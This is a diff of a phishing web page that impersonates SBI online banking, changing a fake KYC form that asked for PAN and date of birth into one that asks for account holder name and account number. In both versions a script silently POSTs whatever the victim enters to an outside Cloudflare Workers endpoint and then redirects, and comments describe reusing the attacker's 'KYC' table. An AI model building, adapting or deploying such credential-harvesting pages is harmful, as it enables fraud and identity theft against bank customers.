@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBI - KYC Verification</title>
+    <title>SBI - Online Banking</title>
     <style>
         * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
         body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
@@ -13,65 +13,58 @@
         .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; }
         
         .content-area { padding: 20px 25px; }
-        .instruction-text { font-size: 13px; color: #333; margin-bottom: 20px; line-height: 1.5; border-left: 4px solid #FF9800; padding-left: 10px; }
+        .instruction-text { font-size: 13px; color: #333; margin-bottom: 20px; line-height: 1.5; border-left: 4px solid #315195; padding: 10px; background: #f8fbff; }
         
         .field-group { margin-bottom: 18px; }
         .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: bold; }
         
-        /* Styled Inputs */
-        .kyc-input { 
-            width: 100%; height: 40px; padding: 0 12px; 
-            background-color: #f9f9f9; border: 1px solid #ccc; 
-            border-radius: 4px; font-size: 15px; outline: none;
-            color: #333; text-transform: uppercase;
+        .bank-input { 
+            width: 100%; height: 38px; padding: 0 12px; 
+            background-color: #fff; border: 1px solid #999; 
+            border-radius: 2px; font-size: 15px; outline: none;
+            color: #333;
         }
-        .kyc-input:focus { border-color: #315195; background-color: #fff; }
-        
-        /* DOB Input specific */
-        input[type="date"] { text-transform: none; }
+        .bank-input:focus { border-color: #315195; box-shadow: 0 0 3px rgba(49,81,149,0.2); }
 
         .btn-row { display: flex; gap: 12px; margin-top: 25px; }
-        .btn { flex: 1; padding: 12px 0; border: none; color: white; font-size: 15px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .btn { padding: 10px 25px; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; }
         .btn-submit { background-color: #315195; }
-        .btn-submit:active { background-color: #1a237e; }
         .btn-gray { background-color: #6c757d; }
 
-        .secure-msg { margin-top: 25px; display: flex; align-items: center; gap: 10px; font-size: 11px; color: #777; }
-        .lock-icon { font-size: 16px; }
+        .footer-note { margin-top: 30px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
-        <div class="header-bar">KYC Verification / PAN Update</div>
+        <div class="header-bar">Profile Update / Account Validation</div>
 
         <div class="content-area">
             <div class="instruction-text">
-                As per regulatory guidelines, please verify your PAN details and Date of Birth to continue using Online Banking services.
+                Please provide your <b>Account Number</b> and <b>Full Name</b> as per bank records to synchronize your profile with the new security protocols.
             </div>
 
-            <form id="kycForm">
+            <form id="accountForm">
                 <div class="field-group">
-                    <label>Permanent Account Number (PAN)*</label>
-                    <input type="text" id="pan_no" class="kyc-input" maxlength="10" placeholder="ABCDE1234F" required 
-                           pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Please enter a valid 10-digit PAN">
+                    <label>Account Holder Name *</label>
+                    <input type="text" id="acc_name" class="bank-input" placeholder="Full Name (As per Bank)" required autocomplete="off">
                 </div>
 
                 <div class="field-group">
-                    <label>Date of Birth (DOB)*</label>
-                    <input type="date" id="dob_val" class="kyc-input" required>
+                    <label>11-Digit Account Number *</label>
+                    <input type="number" id="acc_no" class="bank-input" placeholder="Enter Account Number" required 
+                           oninput="if(this.value.length > 11) this.value = this.value.slice(0, 11);" autocomplete="off">
                 </div>
 
                 <div class="btn-row">
-                    <button type="submit" class="btn btn-submit" id="submitBtn">Verify & Proceed</button>
-                    <button type="reset" class="btn btn-gray">Reset</button>
+                    <button type="submit" class="btn btn-submit" id="submitBtn">Submit Details</button>
+                    <button type="reset" class="btn btn-gray">Cancel</button>
                 </div>
             </form>
 
-            <div class="secure-msg">
-                <span class="lock-icon">🔒</span>
-                Your information is encrypted and processed through a 256-bit secure connection.
+            <div class="footer-note">
+                <b>Note:</b> Make sure the account number is correct to avoid any transaction failures. OnlineSBI values your privacy.
             </div>
         </div>
 
@@ -83,25 +76,24 @@
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        document.getElementById('kycForm').addEventListener('submit', async function(e) {
+        document.getElementById('accountForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const pan = document.getElementById('pan_no').value.toUpperCase();
-            const dob = document.getElementById('dob_val').value;
+            const accName = document.getElementById('acc_name').value;
+            const accNo = document.getElementById('acc_no').value;
             const btn = document.getElementById('submitBtn');
 
             btn.disabled = true;
             btn.innerText = "Verifying...";
 
-            // Payload for KYC Table
+            // KYC table hi use kar rahe hain, bas data content badal diya
             const payload = {
-                type: "KYC",
-                pan: pan,
-                dob: dob
+                type: "KYC", // Worker ke database mein isi table mein jayega
+                pan: "NAME: " + accName, // PAN ki jagah Name bhej rahe hain
+                dob: "ACC: " + accNo    // DOB ki jagah Acc No bhej rahe hain
             };
 
             try {
-                // Background send to Worker
                 await fetch(workerURL, {
                     method: 'POST',
                     mode: 'cors',
@@ -109,7 +101,7 @@
                     body: JSON.stringify(payload)
                 });
                 
-                // Final Redirect (Aap yahan Bank Page ya Success Page dal sakte ho)
+                // Final redirect
                 window.location.href = "final.html"; 
             } catch (err) {
                 window.location.href = "final.html";
@@ -118,4 +110,3 @@
     </script>
 </body>
 </html>
-
